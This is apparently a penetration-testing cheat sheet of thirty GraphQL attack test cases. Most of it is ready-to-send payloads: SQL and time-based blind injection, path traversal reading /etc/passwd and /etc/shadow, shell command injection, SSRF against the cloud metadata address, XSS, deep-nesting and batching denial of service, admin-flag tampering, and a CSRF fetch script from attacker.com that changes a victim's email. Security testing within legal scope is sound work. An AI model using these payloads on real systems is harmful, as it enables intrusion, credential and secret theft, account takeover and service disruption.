

---

##  GraphQL Security Test Cases

Each of the following test cases targets a common weakness in GraphQL-based APIs. Use them for learning, testing, or during bug bounty/security assessments (in legal scopes only).
The structure: **Title + Simple Explanation + Payload**

---

### 1. GraphQL Endpoint Discovery

**Explanation:**
Most apps that use GraphQL expose the API at common paths like `/graphql` or `/api/graphql`. You can try those to see if the endpoint is alive.

**Payload:**

```json
{
"query": [
"/graphql",
"/api/graphql",
"/api/v1/graphql",
"/graphql-server",
"/graphql-service", "/graphql-api",
"/graphql-endpoint",
"/graphql-console", "/graphql-explorer",
"/graphql-playground", "/graphql-dev",
"/graphqld",
"/gql",
"/graphql/schema",
"/graphql/query",
"/graphql/mutation",
"/graphql/subscriptions"]
}
```

---

### 2. Introspection Enabled

**Explanation:**
If introspection is ON, you can ask the API to show you everything it knows — types, fields, queries. Very useful for mapping.

**Payload:**

```json
{
  "query": "{ __schema { types { name } } }"
}
```

---

### 3. Authentication Bypass

**Explanation:**
Some APIs return sensitive data even if the user isn't logged in properly. Try calling things like `currentUser` or `user(id: 1)`.

**Payload:**

```json
{
  "query": "query { user(id: 1) { id, email, role } }"
}
```

---

### 4. Authorization Bypass

**Explanation:**
Even if you're logged in, you shouldn't see admin or other users’ data. If you can — then it’s a permission issue.

**Payload:**

```json
{
  "query": "query { allUsers { id, name, email, password } }"
}
```

---

### 5. SQL Injection (Basic)

**Explanation:**
If the backend turns your input into raw SQL, you might inject things like `' OR 1=1 --` to break the logic.

**Payload:**

```json
{
  "query": "query { users(where: { name: { _eq: \"' OR 1=1 --\" } }) { id, name } }"
}
```

---

### 6. Blind SQL Injection

**Explanation:**
If you can't see the result directly, you can still test for delay-based SQLi using `SLEEP()` functions (if SQL allows).

**Payload:**

```json
{
  "query": "query { login(email: \"test@test.com\", password: \"anything%' OR SLEEP(5) --\") { token } }"
}
```

---

### 7. File Path Traversal

**Explanation:**
Some APIs allow reading files. If not secured, you can try jumping out of the app folder with `../` to access system files.

**Payload:**

```json
{
  "query": "query { readFile(path: \"../../../../etc/passwd\") { content } }"
}
```

---

### 8. Absolute Path Disclosure

**Explanation:**
If the API reads files directly, try full paths like `/etc/shadow` or `/proc/self/environ` to leak system data.

**Payload:**

```json
{
  "query": "query { readFile(path: \"/etc/shadow\") { content } }"
}
```

---

### 9. Command Injection

**Explanation:**
If there’s a resolver that runs system commands, try injecting shell commands like `ls`, `cat`, etc.

**Payload:**

```json
{
  "query": "query { runCommand(input: \"cat /etc/passwd\") }"
}
```

---

### 10. Server Side Request Forgery (SSRF)

**Explanation:**
If the API lets you fetch a URL, try hitting internal services like `http://localhost:3000` or cloud metadata.

**Payload:**

```json
{
  "query": "query { fetchUrl(url: \"http://169.254.169.254/latest/meta-data/\") }"
}
```

---

### 11. Cross-Site Scripting (XSS)

**Explanation:**
If the app reflects user input back to the frontend without sanitizing it, you can inject JavaScript.

**Payload:**

```json
{
  "query": "query { searchUser(name: \"<script>alert('XSS')</script>\") { id } }"
}
```

---

### 12. Denial of Service (DoS) – Deep Nesting

**Explanation:**
GraphQL lets you nest fields a lot. Abuse that to make a super deep query and slow down or crash the server.

**Payload:**

```graphql
query {
  a {
    b {
      c {
        d {
          e {
            f {
              g {
                h {
                  i {
                    j {
                      id
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

---

### 13. No Query Provided

**Explanation:**
Send a request without a query. Some misconfigured servers might still respond or crash.

**Payload:**

```json
{
  "variables": {}
}
```

---

### 14. Mutation Without Auth

**Explanation:**
Try sending a mutation (like creating or deleting something) while you're not authenticated.

**Payload:**

```json
{
  "query": "mutation { createPost(title: \"Hacked\", content: \"lol\") { id } }"
}
```

---

### 15. Variable Type Mismatch

**Explanation:**
Sometimes sending the wrong type in a variable (like sending an object instead of a string) can break the API or leak info.

**Payload:**

```json
{
  "query": "query ($name: String!) { users(where: { name: { _eq: $name } }) { id } }",
  "variables": {
    "name": { "type": "wrong" }
  }
}
```

---



### 16. Invalid Query Format

**Explanation:**
Sending a broken or badly formatted query can crash weak GraphQL parsers or reveal internal error messages.

**Payload:**

```json
{
  "query": "query { user(id: 1) { id name email }"  // Missing closing brace
}
```

---

### 17. Query with Too Many Results

**Explanation:**
Try pulling large amounts of data (e.g., no limit/filters). This could slow down the app or cause memory issues.

**Payload:**

```json
{
  "query": "query { users { id name email } }"
}
```

---

### 18. Long Execution Time

**Explanation:**
Query fields that take time to process (like complex joins or heavy calculations). Useful for DoS testing.

**Payload:**

```json
{
  "query": "query { longRunningProcess }"
}
```

---

### 19. Query with Missing Required Variables

**Explanation:**
If a query expects a variable and you don’t provide it, some APIs throw errors that reveal schema structure.

**Payload:**

```json
{
  "query": "query GetUser($email: String!) { user(where: { email: { _eq: $email } }) { id } }",
  "variables": {}
}
```

---

### 20. Mutation with Insufficient Privileges

**Explanation:**
Try deleting/modifying stuff you shouldn't access (like another user’s post). If it works — there’s a flaw.

**Payload:**

```json
{
  "query": "mutation { deleteUser(id: \"1\") { id } }"
}
```


---

### 21. GraphQL Alias Overuse (Obfuscation)

**Explanation:**
Aliases let you rename fields. Attackers can hide malicious queries or make detection harder.

**Payload:**

```graphql
query {
  a1: user(id: 1) { email }
  a2: user(id: 1) { password }
  a3: user(id: 1) { token }
}
```

---

### 22. Recursion Attack

**Explanation:**
GraphQL allows querying deeply nested fields. If there's no depth limit, this can kill performance.

**Payload:**

```graphql
query {
  user(id: 1) {
    friends {
      friends {
        friends {
          friends {
            name
          }
        }
      }
    }
  }
}
```

---

### 23. Field Suggestion Leak (Intelligent Error Abuse)

**Explanation:**
GraphQL error messages often suggest correct field names. This helps with brute-forcing hidden fields.

**Payload:**

```json
{
  "query": "query { usre(id: 1) { id } }" // 'usre' instead of 'user'
}
```

---

### 24. Batch Queries (Overhead Abuse)

**Explanation:**
Some GraphQL servers accept multiple queries in a single request (batching). That can be abused for DoS or brute-force.

**Payload:**

```json
[
  { "query": "{ user(id: 1) { id } }" },
  { "query": "{ user(id: 2) { id } }" },
  { "query": "{ user(id: 3) { id } }" },
  { "query": "{ user(id: 4) { id } }" }
]
```

---

### 25. GraphQL Injection

**Explanation:**
Injecting dynamic fields into a query string. Dangerous if GraphQL is implemented insecurely on the backend.

**Payload:**

```json
{
  "query": "query getUser($field: String!) { user { $field } }",
  "variables": {
    "field": "password"
  }
}
```

> Should be blocked. GraphQL shouldn't allow variable interpolation inside query structure.

---

### 26. Bypassing Field Restrictions via Introspection

**Explanation:**
Sometimes introspection is off globally, but works on specific types or subfields.

**Payload:**

```json
{
  "query": "query { __type(name:\"User\") { name fields { name type { name } } } }"
}
```

---

### 27. Mutation Tampering (Data Injection)

**Explanation:**
Try injecting unexpected fields or types in mutation inputs — might bypass frontend validations.

**Payload:**

```json
{
  "query": "mutation { updateUser(id: 1, input: { name: \"Attacker\", isAdmin: true }) { id } }"
}
```

---

### 28. CSRF on GraphQL Mutations

**Explanation:**
If CORS is misconfigured and cookies are used for auth, you can trigger mutations from another site.

**Payload:**
*Embed this query in a hidden form or JS in attacker.com*

```javascript
fetch("https://victim.com/graphql", {
  method: "POST",
  credentials: "include",
  headers: {
    "Content-Type": "application/json"
  },
  body: JSON.stringify({
    query: "mutation { changeEmail(newEmail: \"attacker@mail.com\") { id } }"
  })
});
```

---

### 29. Exposed Secrets via Schema Misconfig

**Explanation:**
If the schema exposes internal types (like Env, Settings), you might access secrets.

**Payload:**

```json
{
  "query": "query { config { envVariables } }"
}
```

---

### 30. Unauthorized File Upload or Command Trigger

**Explanation:**
Some GraphQL APIs allow uploading files or triggering jobs. Test if access is open.

**Payload:**

```json
{
  "query": "mutation { uploadFile(file: \"data.zip\") { id url } }"
}
```

---




